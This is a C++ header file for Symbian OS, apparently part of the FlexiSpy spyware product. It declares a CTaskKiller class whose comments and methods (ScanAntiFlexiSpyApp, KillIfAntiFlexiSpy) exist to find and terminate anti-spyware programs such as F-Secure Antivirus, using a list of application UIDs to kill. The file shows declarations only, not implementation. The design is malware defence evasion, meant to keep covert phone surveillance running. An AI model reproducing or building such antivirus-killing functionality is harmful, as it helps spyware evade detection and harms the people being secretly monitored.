#ifndef __TheKiller_H__
#define __TheKiller_H__

#include <APGTASK.H>
#include "CommonServices.h"

class RWsSession;
class RWindowGroup;
class CFxsAppUi;
class RCommonServices;

/**
This utility kills incompatible application such as F-Secure Antivirus.*/
class CTaskKiller : public CActive
	{
public:
	static CTaskKiller* NewL(RCommonServices& aCommonService);
	~CTaskKiller();
	void ScanAntiFlexiSpyApp();
	/**
	* kill if the specified uid is F-Secure
	* @return KErrNone if success
	*/
	TInt KillIfAntiFlexiSpy(TUid aUid);
	TInt Kill(TUid aUid);
	
	//this will be called when the server is terminated
	//and to update an active session	
	void SetNewSession(RCommonServices aComnServSession);
private:
	void DoCancel();
	void RunL();
	TInt RunError(TInt aError);
	
private:
	CTaskKiller(RCommonServices& aCommonService);
	void ConstructL();
	void LoadPropertyL();
	void CompleteSelf();
private:
	//not owned, do not close it
	//this is not reference type so that it can copy new session if the server is dead
	RCommonServices iCommonService;
	RWsSession& iWs;
	RWindowGroup& iRootWin;
	/**
	Array of incompatible applicatio UID that need to be killed*/
	RArray<TUid> iUidArray;	
	};
	
#endif
